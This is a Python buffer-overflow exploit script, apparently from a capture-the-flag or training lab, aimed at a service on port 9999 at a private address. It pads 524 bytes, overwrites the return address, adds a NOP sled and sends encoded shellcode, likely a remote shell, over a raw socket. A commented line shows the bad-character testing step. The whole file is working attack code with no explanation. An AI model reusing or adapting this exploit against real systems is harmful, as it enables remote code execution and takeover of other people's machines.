import socket
from colorama import Fore


OFFSET = 524
TARGET = "10.10.22.96"
TARGET_PORT = 9999
socket.setdefaulttimeout(1)

shell =  b""
shell += b"\xdb\xcf\xbe\x68\xe6\xc8\xdd\xd9\x74\x24\xf4\x5a\x29"
shell += b"\xc9\xb1\x59\x31\x72\x19\x03\x72\x19\x83\xea\xfc\x8a"
shell += b"\x13\x34\x35\xc5\xdc\xc5\xc6\xb9\x55\x20\xf7\xeb\x02"
shell += b"\x20\xaa\x3b\x40\x64\x47\xb0\x04\x9d\xdc\xb4\x80\x92"
shell += b"\x55\x72\xf7\x9d\x66\xb3\x37\x71\xa4\xd2\xcb\x88\xf9"
shell += b"\x34\xf5\x42\x0c\x35\x32\x15\x7a\xda\xee\x2d\xd6\x34"
shell += b"\x58\xb9\x95\x08\x67\x6d\x92\x30\x1f\x08\x65\xc4\x93"
shell += b"\x13\xb6\xaf\x64\x0c\x66\x24\x2c\x0c\x87\xe9\x48\x85"
shell += b"\xf3\x31\x62\xe9\xb5\xc2\xb0\x9e\x47\x02\x89\x60\xeb"
shell += b"\x6b\x25\x6d\xf5\xac\x82\x8e\x80\xc6\xf0\x33\x93\x1d"
shell += b"\x8a\xef\x16\x81\x2c\x7b\x80\x65\xcc\xa8\x57\xee\xc2"
shell += b"\x05\x13\xa8\xc6\x98\xf0\xc3\xf3\x11\xf7\x03\x72\x61"
shell += b"\xdc\x87\xde\x31\x7d\x9e\xba\x94\x82\xc0\x63\x48\x27"
shell += b"\x8b\x86\x9f\x57\x74\x59\xa0\x05\xe2\x95\x6d\xb6\xf2"
shell += b"\xb1\xe6\xc5\xc0\x1e\x5d\x42\x68\xd6\x7b\x95\xf9\xf0"
shell += b"\x7b\x49\x41\x90\x85\x6a\xb1\xb8\x41\x3e\xe1\xd2\x60"
shell += b"\x3f\x6a\x23\x8c\xea\x06\x29\x1a\x1f\xd0\x3b\x3d\x77"
shell += b"\xde\x43\xe6\x86\x57\xa5\xb8\xc6\x37\x7a\x79\xb7\xf7"
shell += b"\x2a\x11\xdd\xf8\x15\x01\xde\xd3\x3d\xa8\x31\x8d\x16"
shell += b"\x45\xab\x94\xed\xf4\x34\x03\x88\x37\xbe\xa1\x6c\xf9"
shell += b"\x37\xc0\x7e\xee\x2f\x2a\x7f\xef\xc5\x2a\x15\xeb\x4f"
shell += b"\x7d\x81\xf1\xb6\x49\x0e\x09\x9d\xca\x49\xf5\x60\xfa"
shell += b"\x22\xc0\xf6\x42\x5d\x2d\x17\x42\x9d\x7b\x7d\x42\xf5"
shell += b"\xdb\x25\x11\xe0\x23\xf0\x06\xb9\xb1\xfb\x7e\x6d\x11"
shell += b"\x94\x7c\x48\x55\x3b\x7f\xbf\xe5\x3c\x7f\x3d\xc2\xe4"
shell += b"\x17\xbd\x52\x15\xe7\xd7\x52\x45\x8f\x2c\x7c\x6a\x7f"
shell += b"\xcc\x57\x23\x17\x47\x36\x81\x86\x58\x13\x47\x16\x58"
shell += b"\x90\x5c\xa9\x23\xd9\x63\x4a\xd4\xf3\x07\x4b\xd4\xfb"
shell += b"\x39\x70\x02\xc2\x4f\xb7\x96\x71\x5f\x82\xbb\xd0\xca"

try:
	payload = b"\x55" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 100 + shell
	#payload = b"\x55" * 524 + b"B" * 4 + badchars
	print("Creating socket\t\t . . . . . ", end='')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print(Fore.GREEN + "SOCKET INITIALIZED" + Fore.RESET)
	print("Connecting to target\t . . . . . ", end="")
	s.connect((TARGET, TARGET_PORT))
	print(Fore.GREEN + "CONNECTED" + Fore.RESET)
	RETURNED_DATA = s.recv(1024)
	#print(f"RETURNED_DATA : \n{RETURNED_DATA.decode()}")
	print(f"Sending {len(payload)} bytes\t . . . . . ", end="")
	s.send(payload)
except socket.timeout:
	print(Fore.RED + "FAIL TO SEND BYTES" + Fore.RESET)
	exit(1)
print(Fore.GREEN + "BYTES SENT" + Fore.RESET)